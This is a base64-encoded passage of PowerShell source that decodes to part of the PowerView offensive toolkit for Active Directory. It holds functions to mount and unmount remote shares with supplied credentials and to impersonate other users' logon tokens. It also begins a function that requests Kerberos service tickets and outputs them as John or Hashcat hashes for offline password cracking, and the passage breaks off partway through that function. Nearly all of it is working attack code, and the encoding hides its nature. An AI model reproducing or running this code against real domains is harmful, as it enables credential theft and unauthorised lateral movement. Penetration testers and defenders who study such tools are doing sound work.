biA9IDAsIFBhcmFtZXRlclNldE5hbWUgPSAnUGF0aCcsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVQYXR0ZXJuKCdcXFxcLipcXC4qJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQYXRoLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkTmV0UmVzb3VyY2VJbnN0YW5jZSA9IFtBY3RpdmF0b3JdOjpDcmVhdGVJbnN0YW5jZSgkTkVUUkVTT1VSQ0VXKQogICAgICAgICROZXRSZXNvdXJjZUluc3RhbmNlLmR3VHlwZSA9IDEKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAkUGF0aHMgPSBAKCkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXJOYW1lIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlck5hbWUgPSAkVGFyZ2V0Q29tcHV0ZXJOYW1lLlRyaW0oJ1wnKQogICAgICAgICAgICAgICAgJFBhdGhzICs9ICwiXFwkVGFyZ2V0Q29tcHV0ZXJOYW1lXElQQyQiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRQYXRocyArPSAsJFBhdGgKICAgICAgICB9CgogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRocykgewogICAgICAgICAgICAkTmV0UmVzb3VyY2VJbnN0YW5jZS5scFJlbW90ZU5hbWUgPSAkVGFyZ2V0UGF0aAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQWRkLVJlbW90ZUNvbm5lY3Rpb25dIEF0dGVtcHRpbmcgdG8gbW91bnQ6ICRUYXJnZXRQYXRoIgoKICAgICAgICAgICAgIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9hYTM4NTQxMyh2PXZzLjg1KS5hc3B4CiAgICAgICAgICAgICMgICBDT05ORUNUX1RFTVBPUkFSWSA9IDQKICAgICAgICAgICAgJFJlc3VsdCA9ICRNcHI6OldOZXRBZGRDb25uZWN0aW9uMlcoJE5ldFJlc291cmNlSW5zdGFuY2UsICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQsICRDcmVkZW50aWFsLlVzZXJOYW1lLCA0KQoKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWVxIDApIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIiRUYXJnZXRQYXRoIHN1Y2Nlc3NmdWxseSBtb3VudGVkIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgVGhyb3cgIltBZGQtUmVtb3RlQ29ubmVjdGlvbl0gZXJyb3IgbW91bnRpbmcgJFRhcmdldFBhdGggOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dJFJlc3VsdCkuTWVzc2FnZSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbiB7CjwjCi5TWU5PUFNJUwoKRGVzdHJveXMgYSBjb25uZWN0aW9uIGNyZWF0ZWQgYnkgTmV3LVJlbW90ZUNvbm5lY3Rpb24uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBTUmVmbGVjdCAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gdXNlcyBXTmV0Q2FuY2VsQ29ubmVjdGlvbjIgdG8gZGVzdHJveSBhIGNvbm5lY3Rpb24gY3JlYXRlZCBieQpOZXctUmVtb3RlQ29ubmVjdGlvbi4gSWYgYSAtUGF0aCBpc24ndCBzcGVjaWZpZWQsIGEgLUNvbXB1dGVyTmFtZSBpcyByZXF1aXJlZCB0bwondW5tb3VudCcgXFwkQ29tcHV0ZXJOYW1lXElQQyQuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBzeXN0ZW0gdG8gcmVtb3ZlIGEgXFxDb21wdXRlck5hbWVcSVBDJCBjb25uZWN0aW9uIGZvci4KCi5QQVJBTUVURVIgUGF0aAoKU3BlY2lmaWVzIHRoZSByZW1vdGUgXFxVTkNccGF0aCB0byByZW1vdmUgdGhlIGNvbm5lY3Rpb24gZm9yLgoKLkVYQU1QTEUKClJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIC1Db21wdXRlck5hbWUgJ1BSSU1BUlkudGVzdGxhYi5sb2NhbCcKCi5FWEFNUExFCgpSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbiAtUGF0aCAnXFxQUklNQVJZLnRlc3RsYWIubG9jYWxcQyRcJwoKLkVYQU1QTEUKCkAoJ1BSSU1BUlkudGVzdGxhYi5sb2NhbCcsJ1NFQ09OREFSWS50ZXN0bGFiLmxvY2FsJykgfCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJOYW1lJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJOYW1lJywgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgUGFyYW1ldGVyU2V0TmFtZSA9ICdQYXRoJywgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVBhdHRlcm4oJ1xcXFwuKlxcLionKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFBhdGgKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICAkUGF0aHMgPSBAKCkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXJOYW1lIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlck5hbWUgPSAkVGFyZ2V0Q29tcHV0ZXJOYW1lLlRyaW0oJ1wnKQogICAgICAgICAgICAgICAgJFBhdGhzICs9ICwiXFwkVGFyZ2V0Q29tcHV0ZXJOYW1lXElQQyQiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRQYXRocyArPSAsJFBhdGgKICAgICAgICB9CgogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRocykgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb25dIEF0dGVtcHRpbmcgdG8gdW5tb3VudDogJFRhcmdldFBhdGgiCiAgICAgICAgICAgICRSZXN1bHQgPSAkTXByOjpXTmV0Q2FuY2VsQ29ubmVjdGlvbjIoJFRhcmdldFBhdGgsIDAsICRUcnVlKQoKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWVxIDApIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIiRUYXJnZXRQYXRoIHN1Y2Nlc3NmdWxseSB1bW1vdW50ZWQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBUaHJvdyAiW1JlbW92ZS1SZW1vdGVDb25uZWN0aW9uXSBlcnJvciB1bm1vdW50aW5nICRUYXJnZXRQYXRoIDogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIHsKPCMKLlNZTk9QU0lTCgpDcmVhdGVzIGEgbmV3ICJydW5hcyAvbmV0b25seSIgdHlwZSBsb2dvbiBhbmQgaW1wZXJzb25hdGVzIHRoZSB0b2tlbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB1c2VzIExvZ29uVXNlcigpIHdpdGggdGhlIExPR09OMzJfTE9HT05fTkVXX0NSRURFTlRJQUxTIExvZ29uVHlwZQp0byBzaW11bGF0ZSAicnVuYXMgL25ldG9ubHkiLiBUaGUgcmVzdWx0aW5nIHRva2VuIGlzIHRoZW4gaW1wZXJzb25hdGVkIHdpdGgKSW1wZXJzb25hdGVMb2dnZWRPblVzZXIoKSBhbmQgdGhlIHRva2VuIGhhbmRsZSBpcyByZXR1cm5lZCBmb3IgbGF0ZXIgdXNhZ2UKd2l0aCBJbnZva2UtUmV2ZXJ0VG9TZWxmLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgd2l0aCBhbHRlcm5hdGUgY3JlZGVudGlhbHMKdG8gaW1wZXJzb25hdGUgaW4gdGhlIGN1cnJlbnQgdGhyZWFkIHNwYWNlLgoKLlBBUkFNRVRFUiBUb2tlbkhhbmRsZQoKQW4gSW50UHRyIFRva2VuSGFuZGxlIHJldHVybmVkIGJ5IGEgcHJldmlvdXMgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgpJZiB0aGlzIGlzIHN1cHBsaWVkLCBMb2dvblVzZXIoKSBpcyBza2lwcGVkIGFuZCBvbmx5IEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyKCkKaXMgZXhlY3V0ZWQuCgouUEFSQU1FVEVSIFF1aWV0CgpTdXBwcmVzcyBhbnkgd2FybmluZ3MgYWJvdXQgU1RBIHZzIE1UQS4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpJbnRQdHIKClRoZSBUb2tlbkhhbmRsZSByZXN1bHQgZnJvbSBMb2dvblVzZXIuCiM+CgogICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQ3JlZGVudGlhbCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdDcmVkZW50aWFsJyldCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnVG9rZW5IYW5kbGUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkVG9rZW5IYW5kbGUsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFF1aWV0CiAgICApCgogICAgaWYgKChbU3lzdGVtLlRocmVhZGluZy5UaHJlYWRdOjpDdXJyZW50VGhyZWFkLkdldEFwYXJ0bWVudFN0YXRlKCkgLW5lICdTVEEnKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snUXVpZXQnXSkpIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJbSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uXSBwb3dlcnNoZWxsLmV4ZSBpcyBub3QgY3VycmVudGx5IGluIGEgc2luZ2xlLXRocmVhZGVkIGFwYXJ0bWVudCBzdGF0ZSwgdG9rZW4gaW1wZXJzb25hdGlvbiBtYXkgbm90IHdvcmsuIgogICAgfQoKICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Rva2VuSGFuZGxlJ10pIHsKICAgICAgICAkTG9nb25Ub2tlbkhhbmRsZSA9ICRUb2tlbkhhbmRsZQogICAgfQogICAgZWxzZSB7CiAgICAgICAgJExvZ29uVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICROZXR3b3JrQ3JlZGVudGlhbCA9ICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkKICAgICAgICAkVXNlckRvbWFpbiA9ICROZXR3b3JrQ3JlZGVudGlhbC5Eb21haW4KICAgICAgICAkVXNlck5hbWUgPSAkTmV0d29ya0NyZWRlbnRpYWwuVXNlck5hbWUKICAgICAgICBXcml0ZS1XYXJuaW5nICJbSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uXSBFeGVjdXRpbmcgTG9nb25Vc2VyKCkgd2l0aCB1c2VyOiAkKCRVc2VyRG9tYWluKVwkKCRVc2VyTmFtZSkiCgogICAgICAgICMgTE9HT04zMl9MT0dPTl9ORVdfQ1JFREVOVElBTFMgPSA5LCBMT0dPTjMyX1BST1ZJREVSX1dJTk5UNTAgPSAzCiAgICAgICAgIyAgIHRoaXMgaXMgdG8gc2ltdWxhdGUgInJ1bmFzLmV4ZSAvbmV0b25seSIgZnVuY3Rpb25hbGl0eQogICAgICAgICRSZXN1bHQgPSAkQWR2YXBpMzI6OkxvZ29uVXNlcigkVXNlck5hbWUsICRVc2VyRG9tYWluLCAkTmV0d29ya0NyZWRlbnRpYWwuUGFzc3dvcmQsIDksIDMsIFtyZWZdJExvZ29uVG9rZW5IYW5kbGUpOyRMYXN0RXJyb3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpOwoKICAgICAgICBpZiAoLW5vdCAkUmVzdWx0KSB7CiAgICAgICAgICAgIHRocm93ICJbSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uXSBMb2dvblVzZXIoKSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgICAgICB9CiAgICB9CgogICAgIyBhY3R1YWxseSBpbXBlcnNvbmF0ZSB0aGUgdG9rZW4gZnJvbSBMb2dvblVzZXIoKQogICAgJFJlc3VsdCA9ICRBZHZhcGkzMjo6SW1wZXJzb25hdGVMb2dnZWRPblVzZXIoJExvZ29uVG9rZW5IYW5kbGUpCgogICAgaWYgKC1ub3QgJFJlc3VsdCkgewogICAgICAgIHRocm93ICJbSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uXSBJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcigpIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgfQoKICAgIFdyaXRlLVZlcmJvc2UgIltJbnZva2UtVXNlckltcGVyc29uYXRpb25dIEFsdGVybmF0ZSBjcmVkZW50aWFscyBzdWNjZXNzZnVsbHkgaW1wZXJzb25hdGVkIgogICAgJExvZ29uVG9rZW5IYW5kbGUKfQoKCmZ1bmN0aW9uIEludm9rZS1SZXZlcnRUb1NlbGYgewo8IwouU1lOT1BTSVMKClJldmVydHMgYW55IHRva2VuIGltcGVyc29uYXRpb24uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBTUmVmbGVjdCAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gdXNlcyBSZXZlcnRUb1NlbGYoKSB0byByZXZlcnQgYW55IGltcGVyc29uYXRlZCB0b2tlbnMuCklmIC1Ub2tlbkhhbmRsZSBpcyBwYXNzZWQgKHRoZSB0b2tlbiBoYW5kbGUgcmV0dXJuZWQgYnkgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uKSwKQ2xvc2VIYW5kbGUoKSBpcyB1c2VkIHRvIGNsb3NlIHRoZSBvcGVuZWQgaGFuZGxlLgoKLlBBUkFNRVRFUiBUb2tlbkhhbmRsZQoKQW4gb3B0aW9uYWwgSW50UHRyIFRva2VuSGFuZGxlIHJldHVybmVkIGJ5IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQokVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWQKSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJFRva2VuCiM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGwoKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRUb2tlbkhhbmRsZQogICAgKQoKICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Rva2VuSGFuZGxlJ10pIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJbSW52b2tlLVJldmVydFRvU2VsZl0gUmV2ZXJ0aW5nIHRva2VuIGltcGVyc29uYXRpb24gYW5kIGNsb3NpbmcgTG9nb25Vc2VyKCkgdG9rZW4gaGFuZGxlIgogICAgICAgICRSZXN1bHQgPSAkS2VybmVsMzI6OkNsb3NlSGFuZGxlKCRUb2tlbkhhbmRsZSkKICAgIH0KCiAgICAkUmVzdWx0ID0gJEFkdmFwaTMyOjpSZXZlcnRUb1NlbGYoKTskTGFzdEVycm9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKTsKCiAgICBpZiAoLW5vdCAkUmVzdWx0KSB7CiAgICAgICAgdGhyb3cgIltJbnZva2UtUmV2ZXJ0VG9TZWxmXSBSZXZlcnRUb1NlbGYoKSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgIH0KCiAgICBXcml0ZS1WZXJib3NlICJbSW52b2tlLVJldmVydFRvU2VsZl0gVG9rZW4gaW1wZXJzb25hdGlvbiBzdWNjZXNzZnVsbHkgcmV2ZXJ0ZWQiCn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluU1BOVGlja2V0IHsKPCMKLlNZTk9QU0lTCgpSZXF1ZXN0IHRoZSBrZXJiZXJvcyB0aWNrZXQgZm9yIGEgc3BlY2lmaWVkIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWUgKFNQTikuCgpBdXRob3I6IG1hY2hvc2VjLCBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgZWl0aGVyIHRha2Ugb25lL21vcmUgU1BOIHN0cmluZ3MsIG9yIG9uZS9tb3JlIFBvd2VyVmlldy5Vc2VyIG9iamVjdHMKKHRoZSBvdXRwdXQgZnJvbSBHZXQtRG9tYWluVXNlcikgYW5kIHdpbGwgcmVxdWVzdCBhIGtlcmJlcm9zIHRpY2tldCBmb3IgdGhlIGdpdmVuIFNQTgp1c2luZyBTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMuS2VyYmVyb3NSZXF1ZXN0b3JTZWN1cml0eVRva2VuLiBUaGUgZW5jcnlwdGVkCnBvcnRpb24gb2YgdGhlIHRpY2tldCBpcyB0aGVuIGV4dHJhY3RlZCBhbmQgb3V0cHV0IGluIGVpdGhlciBjcmFja2FibGUgSm9obiBvciBIYXNoY2F0CmZvcm1hdCAoZGVhZnVsdCBvZiBKb2huKS4KCi5QQVJBTUVURVIgU1BOCgpTcGVjaWZpZXMgdGhlIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWUgdG8gcmVxdWVzdCB0aGUgdGlja2V0IGZvci4KCi5QQVJBTUVURVIgVXNlcgoKU3BlY2lmaWVzIGEgUG93ZXJWaWV3LlVzZXIgb2JqZWN0IChyZXN1bHQgb2YgR2V0LURvbWFpblVzZXIpIHRvIHJlcXVlc3QgdGhlIHRpY2tldCBmb3IuCgouUEFSQU1FVEVSIE91dHB1dEZvcm1hdAoKRWl0aGVyICdKb2huJyBmb3IgSm9obiB0aGUgUmlwcGVyIHN0eWxlIGhhc2ggZm9ybWF0dGluZywgb3IgJ0hhc2hjYXQnIGZvciBIYXNoY2F0IGZvcm1hdC4KRGVmYXVsdHMgdG8gJ0pvaG4nLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgZG9tYWluIHVzaW5nIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluU1BOVGlja2V0IC1TUE4gIkhUVFAvd2ViLnRlc3RsYWIubG9jYWwiCgpSZXF1ZXN0IGEga2VyYmVyb3Mgc2VydmljZSB0aWNrZXQgZm9yIHRoZSBzcGVjaWZpZWQgU1BOLgoKLkVYQU1QTEUKCiJIVFRQL3dlYjEudGVzdGxhYi5sb2NhbCIsIkhUVFAvd2ViMi50ZXN0bGFiLmxvY2FsIiB8IEdldC1Eb21haW5TUE5UaWNrZXQKClJlcXVlc3Qga2VyYmVyb3Mgc2VydmljZSB0aWNrZXRzIGZvciBhbGwgU1BOcyBwYXNzZWQgb24gdGhlIHBpcGVsaW5lLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIC1TUE4gfCBHZXQtRG9tYWluU1BOVGlja2V0IC1PdXRwdXRGb3JtYXQgSGFzaGNhdAoKUmVxdWVzdCBrZXJiZXJvcyBzZXJ2aWNlIHRpY2tldHMgZm9yIGFsbCB1c2VycyB3aXRoIG5vbi1udWxsIFNQTnMgYW5kIG91dHB1dCBpbiBIYXNoY2F0IGZvcm1hdC4KCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cyBvbmUgb3IgbW9yZSBTUE4gc3RyaW5ncyBvbiB0aGUgcGlwZWxpbmUgd2l0aCB0aGUgUmF3U1BOIHBhcmFtZXRlciBzZXQuCgouSU5QVVRTCgpQb3dlclZpZXcuVXNlcgoKQWNjZXB0cyBvbmUgb3IgbW9yZSBQb3dlclZpZXcuVXNlciBvYmplY3RzIG9uIHRoZSBwaXBlbGluZSB3aXRoIHRoZSBVc2VyIHBhcmFtZXRlciBzZXQuCgouT1VUUFVUUwoKUG93ZXJWaWV3LlNQTlRpY2tldAoKT3V0cHV0cyBhIGN1c3RvbSBvYmplY3QgY29udGFpbmluZyB0aGUgU2FtQWNjb3VudE5hbWUsIFNlcnZpY2VQcmluY2lwYWxOYW1lLCBhbmQgZW5jcnlwdGVkIHRpY2tldCBzZWN0aW9uLgojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU1BOVGlja2V0JyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdSYXdTUE4nKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgUGFyYW1ldGVyU2V0TmFtZSA9ICdSYXdTUE4nLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlUGF0dGVybignLiovLionKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQcmluY2lwYWxOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRTUE4sCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBQYXJhbWV0ZXJTZXROYW1lID0gJ1VzZXInLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHsgJF8uUFNPYmplY3QuVHlwZU5hbWVzWzBdIC1lcSAnUG93ZXJWaWV3LlVzZXInIH0pXQogICAgICAgIFtPYmplY3RbXV0KICAgICAgICAkVXNlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdKb2huJywgJ0hhc2hjYXQnKV0KICAgICAgICBbQWxpYXMoJ0Zvcm1hdCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE91dHB1dEZvcm1hdCA9ICdKb2huJywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICROdWxsID0gW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCdTeXN0ZW0uSWRlbnRpdHlNb2RlbCcpCgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyJ10pIHsKICAgICAgICAgICAgJFRhcmdldE9iamVjdCA9ICRVc2VyCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGFyZ2V0T2JqZWN0ID0gJFNQTgogICAgICAgIH0KCiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkVGFyZ2V0T2JqZWN0KSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXInXSkgewogICAgICAgICAgICAgICAgJFVzZXJTUE4gPSAkT2JqZWN0LlNlcnZpY2VQcmluY2lwYWxOYW1lCiAgICAgICAgICAgICAgICAkU2FtQWNjb3VudE5hbWUgPSAkT2JqZWN0LlNhbUFjY291bnROYW1lCiAgICAgICAgICAgICAgICAkRGlzdGluZ3Vpc2hlZE5hbWUgPSAkT2JqZWN0LkRpc3Rpbmd1aXNoZWROYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7